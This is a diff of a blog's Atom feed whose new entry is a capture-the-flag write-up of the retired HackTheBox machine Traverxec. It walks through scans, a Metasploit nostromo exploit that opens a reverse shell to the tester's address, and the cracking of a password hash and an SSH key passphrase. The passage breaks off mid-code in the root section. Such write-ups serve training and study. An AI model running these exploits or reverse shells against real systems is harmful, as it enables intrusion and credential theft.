@@ -1,5 +1,353 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-04-04T19:40:00+02:00</updated><entry><title>HTB: Registry</title><link href="https://maggick.fr/2020/04/htb-registry.html" rel="alternate"></link><published>2020-04-04T19:40:00+02:00</published><updated>2020-04-04T19:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-04:/2020/04/htb-registry.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jarvis Card" class="align-left" src="/media/2020.04/registry_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-04-11T19:00:00+02:00</updated><entry><title>HTB: Traverxec</title><link href="https://maggick.fr/2020/04/htb-traverxec.html" rel="alternate"></link><published>2020-04-11T19:00:00+02:00</published><updated>2020-04-11T19:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-11:/2020/04/htb-traverxec.html</id><summary type="html">&lt;p&gt;&lt;img alt="Traverxec Card" class="align-left" src="/media/2020.04/traverxec_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/217"&gt;Traverxec&lt;/a&gt;.
+This box is rated as an easy box. It implies the exploitation of a CVE on
+notsromo, the use of some nostromo misconfiguration and a little trick to
+trigger a page with a &lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.04/traverxec_card.png" alt="Traverxec Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/217"&gt;Traverxec&lt;/a&gt;.
+This box is rated as an easy box. It implies the exploitation of a CVE on
+notsromo, the use of some nostromo misconfiguration and a little trick to
+trigger a page with a &lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;
+
+
+&lt;h1 id="user-part"&gt;User part&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Wed Nov 27 08:58:11 2019 as: nmap -p- -sS -oA nmap 10.10.10.165&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.165&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.088s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Wed Nov 27 09:01:46 2019 -- 1 IP address (1 host up) scanned in 215.57 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Nothing particular about this services.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Wed Nov 27 09:04:36 2019 as: nmap -p22,80 -sSV -oA nmap 10.10.10.165&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.165&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.097s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http    nostromo 1.9.6&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Wed Nov 27 09:04:44 2019 -- 1 IP address (1 host up) scanned in 7.91 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There is an exploit for nostromo in version 1.9.3 and a metasploit exploit
+without a precision about the version.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# searchsploit nostromo&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                         |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;                                      | (/usr/share/exploitdb/)&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Nostromo - Directory Traversal Remote  | exploits/multiple/remote/47573.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;nostromo nhttpd 1.9.3 - Directory Trav | exploits/linux/remote/35466.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;We run a dirb against the web service.&lt;/p&gt;
+&lt;p&gt;The website is a portfolio for a web and apps developer.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="homepage" src="/media/2020.04/traverxec_1.png"&gt;&lt;/p&gt;
+&lt;p&gt;The directory are listable.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Directory listing" src="/media/2020.04/traverxec_2.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nothing interesting on the web part. Let us run the exploit found in the recon.&lt;/p&gt;
+&lt;h2 id="msf"&gt;MSF&lt;/h2&gt;
+&lt;p&gt;We load the exploit in metasploit, set the option to target the box and set our
+IP work the reverse shell and run it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; use exploit/multi/http/nostromo_code_exec&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; show options&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Module options (exploit/multi/http/nostromo_code_exec):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;   Name     Current Setting  Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;   ----     ---------------  --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
+&lt;span class="code-line"&gt;   RHOSTS   10.10.10.165     yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;   RPORT    80               yes       The target port (TCP)&lt;/span&gt;
+&lt;span class="code-line"&gt;   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0&lt;/span&gt;
+&lt;span class="code-line"&gt;   SRVPORT  8080             yes       The local port to listen on.&lt;/span&gt;
+&lt;span class="code-line"&gt;   SSL      false            no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
+&lt;span class="code-line"&gt;   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)&lt;/span&gt;
+&lt;span class="code-line"&gt;   URIPATH                   no        The URI to use for this exploit (default is random)&lt;/span&gt;
+&lt;span class="code-line"&gt;   VHOST                     no        HTTP server virtual host&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Payload options (cmd/unix/reverse_perl):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;   Name   Current Setting  Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;   ----   ---------------  --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;   LHOST  10.10.15.7       yes       The listen address (an interface may be specified)&lt;/span&gt;
+&lt;span class="code-line"&gt;   LPORT  4444             yes       The listen port&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit target:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;   Id  Name&lt;/span&gt;
+&lt;span class="code-line"&gt;   --  ----&lt;/span&gt;
+&lt;span class="code-line"&gt;   0   Automatic (Unix In-Memory)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.15.7:4444&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Configuring Automatic (Unix In-Memory) target&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Sending cmd/unix/reverse_perl command payload&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Command shell session 2 opened (10.10.15.7:4444 -&amp;gt; 10.10.10.165:56360) at 2019-11-27 09:50:39 +0100&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="nostromo"&gt;nostromo&lt;/h2&gt;
+&lt;p&gt;We got a shell as &lt;code&gt;www-data&lt;/code&gt;. We start enumerating the box. There is a specific
+folder for the &lt;a href="http://www.nazgul.ch/dev_nostromo.html"&gt;nostromo web server&lt;/a&gt;. In
+&lt;code&gt;/var/nostromo/&lt;/code&gt; we found some configuration files.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /var/&lt;/span&gt;
+&lt;span class="code-line"&gt;backups&lt;/span&gt;
+&lt;span class="code-line"&gt;cache&lt;/span&gt;
+&lt;span class="code-line"&gt;lib&lt;/span&gt;
+&lt;span class="code-line"&gt;local&lt;/span&gt;
+&lt;span class="code-line"&gt;lock&lt;/span&gt;
+&lt;span class="code-line"&gt;log&lt;/span&gt;
+&lt;span class="code-line"&gt;mail&lt;/span&gt;
+&lt;span class="code-line"&gt;nostromo&lt;/span&gt;
+&lt;span class="code-line"&gt;opt&lt;/span&gt;
+&lt;span class="code-line"&gt;run&lt;/span&gt;
+&lt;span class="code-line"&gt;spool&lt;/span&gt;
+&lt;span class="code-line"&gt;tmp&lt;/span&gt;
+&lt;span class="code-line"&gt;ls /var/nostromo/&lt;/span&gt;
+&lt;span class="code-line"&gt;conf&lt;/span&gt;
+&lt;span class="code-line"&gt;htdocs&lt;/span&gt;
+&lt;span class="code-line"&gt;icons&lt;/span&gt;
+&lt;span class="code-line"&gt;logs&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -al /var/nostromo/&lt;/span&gt;
+&lt;span class="code-line"&gt;total 24&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  6 root     root   4096 Oct 25 14:43 .&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x 12 root     root   4096 Oct 25 14:43 ..&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  2 root     daemon 4096 Oct 27 16:12 conf&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  6 root     daemon 4096 Oct 25 17:11 htdocs&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  2 root     daemon 4096 Oct 25 14:43 icons&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  2 www-data daemon 4096 Nov 27 03:39 logs&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -al /var/nostromo//conf/&lt;/span&gt;
+&lt;span class="code-line"&gt;total 20&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We display the content of the &lt;code&gt;.htpasswd&lt;/code&gt; file and found a hash.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /var/nostromo//conf/.htpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We load it into john an crack it with the rockyou dictionary. The password is
+"Nowonly4me".&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hash -w=rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;Nowonly4me       (david)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Let us take a closer look at the &lt;code&gt;nhttpd.conf&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /var/nostromo/conf/nhttpd.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;# MAIN [MANDATORY]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;servername      traverxec.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;serverlisten        *&lt;/span&gt;
+&lt;span class="code-line"&gt;serveradmin     david@traverxec.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;serverroot      /var/nostromo&lt;/span&gt;
+&lt;span class="code-line"&gt;servermimes     conf/mimes&lt;/span&gt;
+&lt;span class="code-line"&gt;docroot         /var/nostromo/htdocs&lt;/span&gt;
+&lt;span class="code-line"&gt;docindex        index.html&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# LOGS [OPTIONAL]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;lopid           logs/nhttpd.pid&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# SETUID [RECOMMENDED]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;user            www-data&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# BASIC AUTHENTICATION [OPTIONAL]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;htaccess        .htaccess&lt;/span&gt;
+&lt;span class="code-line"&gt;htpasswd        /var/nostromo/conf/.htpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# ALIASES [OPTIONAL]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;/icons          /var/nostromo/icons&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# HOMEDIRS [OPTIONAL]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;homedirs        /home&lt;/span&gt;
+&lt;span class="code-line"&gt;homedirs_public     public_www&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;According to &lt;a href="http://www.nazgul.ch/dev/nostromo_man.html"&gt;Nostromo manual&lt;/a&gt; the
+&lt;code&gt;HOMEDIRS&lt;/code&gt; section allow the server to serve the user's home and some specific
+folder. In fact this is possible as the &lt;code&gt;http://10.10.10.165/~david/&lt;/code&gt; show us.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="http://10.10.10.165/~david/" src="/media/2020.04/traverxec_5.png"&gt;&lt;/p&gt;
+&lt;p&gt;First of all we use python to get a proper shell &lt;code&gt;python -c 'import pty; pty.spawn("/bin/sh")'&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The we go in the &lt;code&gt;public_www&lt;/code&gt; folder inside david's home folder. We see that
+there is a backup of some SSH identity files in a targz archive.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cd /home/david/public_www/&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /home/david/public_www/&lt;/span&gt;
+&lt;span class="code-line"&gt;$ ls&lt;/span&gt;
+&lt;span class="code-line"&gt;ls&lt;/span&gt;
+&lt;span class="code-line"&gt;index.html  protected-file-area&lt;/span&gt;
+&lt;span class="code-line"&gt;$ ls protected-file-area&lt;/span&gt;
+&lt;span class="code-line"&gt;cls protected-file-area&lt;/span&gt;
+&lt;span class="code-line"&gt;backup-ssh-identity-files.tgz&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We copy the archive to &lt;code&gt;/tmp/&lt;/code&gt;, extract it and cat the private RSA key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/&lt;/span&gt;
+&lt;span class="code-line"&gt;cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cd /tmp/&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /tmp/&lt;/span&gt;
+&lt;span class="code-line"&gt;$ tar xvf backup-ssh-identity-files.tgz&lt;/span&gt;
+&lt;span class="code-line"&gt;tar xvf backup-ssh-identity-files.tgz&lt;/span&gt;
+&lt;span class="code-line"&gt;home/david/.ssh/&lt;/span&gt;
+&lt;span class="code-line"&gt;home/david/.ssh/authorized_keys&lt;/span&gt;
+&lt;span class="code-line"&gt;home/david/.ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;home/david/.ssh/id_rsa.pub&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat home/david/.ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;cat home/david/.ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;Proc-Type: 4,ENCRYPTED&lt;/span&gt;
+&lt;span class="code-line"&gt;DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG&lt;/span&gt;
+&lt;span class="code-line"&gt;tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W&lt;/span&gt;
+&lt;span class="code-line"&gt;KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU&lt;/span&gt;
+&lt;span class="code-line"&gt;RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7&lt;/span&gt;
+&lt;span class="code-line"&gt;HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc&lt;/span&gt;
+&lt;span class="code-line"&gt;Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec&lt;/span&gt;
+&lt;span class="code-line"&gt;dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN&lt;/span&gt;
+&lt;span class="code-line"&gt;6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO&lt;/span&gt;
+&lt;span class="code-line"&gt;xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1&lt;/span&gt;
+&lt;span class="code-line"&gt;Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6&lt;/span&gt;
+&lt;span class="code-line"&gt;i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T&lt;/span&gt;
+&lt;span class="code-line"&gt;fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA&lt;/span&gt;
+&lt;span class="code-line"&gt;bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so&lt;/span&gt;
+&lt;span class="code-line"&gt;uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I&lt;/span&gt;
+&lt;span class="code-line"&gt;Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s&lt;/span&gt;
+&lt;span class="code-line"&gt;9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U&lt;/span&gt;
+&lt;span class="code-line"&gt;rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua&lt;/span&gt;
+&lt;span class="code-line"&gt;4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU&lt;/span&gt;
+&lt;span class="code-line"&gt;/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX&lt;/span&gt;
+&lt;span class="code-line"&gt;JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+&lt;/span&gt;
+&lt;span class="code-line"&gt;XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh&lt;/span&gt;
+&lt;span class="code-line"&gt;hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf&lt;/span&gt;
+&lt;span class="code-line"&gt;SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM&lt;/span&gt;
+&lt;span class="code-line"&gt;j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt&lt;/span&gt;
+&lt;span class="code-line"&gt;VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then try to connect to the box using the key with david account but the SSH
+key is password protected. We use ssh2john to get a crackable hash and run john
+with the rockyou dictionary on it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python /usr/bin/ssh2john id_rsa &amp;gt; id_rsa.hash&lt;/span&gt;
+&lt;span class="code-line"&gt;john  id_rsa.hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;SSH&amp;quot;, but the string is also recognized as &amp;quot;ssh-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=ssh-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 2 (iteration count) is 1 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Note: This format may emit false positives, so it will keep trying even after&lt;/span&gt;
+&lt;span class="code-line"&gt;finding a possible candidate.&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;hunter           (id_rsa)&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: Only 1 candidate left, minimum 4 needed for performance.&lt;/span&gt;
+&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2019-11-27 15:12) 0.2061g/s 2957Kp/s 2957Kc/s 2957KC/s *7¡Vamos!&lt;/span&gt;
+&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then connect to the box as david using the SSH key and its &lt;code&gt;hunter&lt;/code&gt; password.
+And we get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ssh david@10.10.10.165 -i id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;id_rsa&amp;#39;:&lt;/span&gt;
+&lt;span class="code-line"&gt;Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Wed Nov 27 05:55:05 2019 from 10.10.14.25&lt;/span&gt;
+&lt;span class="code-line"&gt;david@traverxec:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;7db0b&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="root-part"&gt;Root part&lt;/h1&gt;
+&lt;p&gt;When trying the command &lt;code&gt;sudo -l&lt;/code&gt; we are prompt for a password. Neither of the
+cracked password (&lt;code&gt;hunter&lt;/code&gt; and &lt;code&gt;Nowonly4me&lt;/code&gt;) works.&lt;/p&gt;
+&lt;p&gt;In the david home folder we find a &lt;code&gt;bin&lt;/code&gt; folder containing a bash program.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
